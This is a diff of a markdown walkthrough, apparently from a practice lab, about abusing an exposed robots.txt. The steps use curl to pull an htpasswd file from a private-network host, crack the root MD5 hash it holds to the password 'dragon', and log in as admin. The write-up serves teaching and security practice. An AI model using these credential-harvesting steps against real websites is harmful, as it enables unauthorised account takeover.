@@ -9,20 +9,17 @@ A robots.txt file specifies which parts of a website are accessible to a web cra
 - [Ways to secure](#Ways to secure)
 
 ### Steps
-
-Open terminal
-
-Run
+* Open terminal
+* Run
 ```bash
 	curl http://192.168.0.108/robots.txt
         
 	curl http://192.168.0.108/whatever/htpasswd #Displays "root:8621ffdbc5698829397d97767ac13db3"
 ```
-
-<a href="https://hashes.com/en/decrypt/hash">MD5 decrypt</a> the value we found
+* <a href="https://hashes.com/en/decrypt/hash">MD5 decrypt</a> the value we found
 	8621ffdbc5698829397d97767ac13db3 -> dragon
 
-Sign in admin using the credentials
+* Sign in admin using the credentials
 	root      [username]
 	dragon    [password]
 
